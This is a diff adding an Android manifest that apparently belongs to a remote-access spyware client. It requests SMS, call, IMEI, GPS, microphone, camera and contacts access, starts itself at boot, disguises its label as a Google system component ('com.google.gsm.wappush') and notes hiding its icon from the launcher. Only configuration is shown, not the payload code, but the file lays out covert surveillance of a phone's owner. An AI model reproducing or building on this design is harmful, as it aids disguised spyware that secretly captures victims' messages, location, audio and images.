@@ -1,0 +1,79 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="my.app.client"
+    android:versionCode="1"
+    android:versionName="1.0" >
+
+    <uses-sdk
+        android:minSdkVersion="9"
+        android:targetSdkVersion="9" />
+
+    <uses-permission android:name="android.permission.RECEIVE_SMS" /> <!-- To activate the service when receiving an SMS -->
+    <uses-permission android:name="android.permission.READ_SMS" /> <!-- to activate the service when the received SMS contains a keyword -->
+    <uses-permission android:name="android.permission.SEND_SMS" /> <!-- To allow sending an SMS -->
+
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" /> <!-- To retrieve the IMEI and all its information -->
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" /> <!-- To retrieve outgoing calls -->
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" /> <!-- To find out if it is connected or not -->
+
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" /> <!-- acess gps -->
+    <uses-permission android:name="android.permission.INTERNET" /> <!-- so we can make sockets -->
+
+    <uses-permission android:name="android.permission.RECORD_AUDIO" /> <!-- record audio -->
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /> <!-- read write flash -->
+
+    <uses-permission android:name="android.permission.CAMERA" /> <!-- camera permissions -->
+
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" /> <!-- To start just after Boot -->
+
+    <uses-permission android:name="android.permission.CALL_PHONE" /> <!-- To allow for appeal (huh?) -->
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.VIBRATE" />
+
+    <application android:label="com.google.gsm.wappush" >
+
+        <!--
+        Keep uncommented to remove app from launcher drawer after run. See LauncherActivity...
+        android:icon="@drawable/ic_launcher"
+        -->
+
+        <receiver android:name="my.app.client.BootReceiver" >
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+
+                <category android:name="android.intent.category.HOME" />
+            </intent-filter>
+        </receiver>
+
+        <service android:name="my.app.client.Client" >
+            <intent-filter>
+                <action android:name=".Client" />
+            </intent-filter>
+        </service>
+
+        <receiver android:name="my.app.client.AlarmListener" >
+        </receiver>
+
+        <activity
+            android:name="my.app.client.LauncherActivity"
+            android:label="com.google.gsm.wappush" >
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+        <activity
+            android:name="my.app.alt.PhotoActivity"
+            android:label="com.google.gsm.wappush" >
+        </activity>
+        <!--
+ ATTENTION: This was auto-generated to add Google Play services to your project for
+     App Indexing.  See https://g.co/AppIndexing/AndroidStudio for more information.
+        -->
+        <meta-data
+            android:name="com.google.android.gms.version"
+            android:value="@integer/google_play_services_version" />
+    </application>
+
+</manifest>
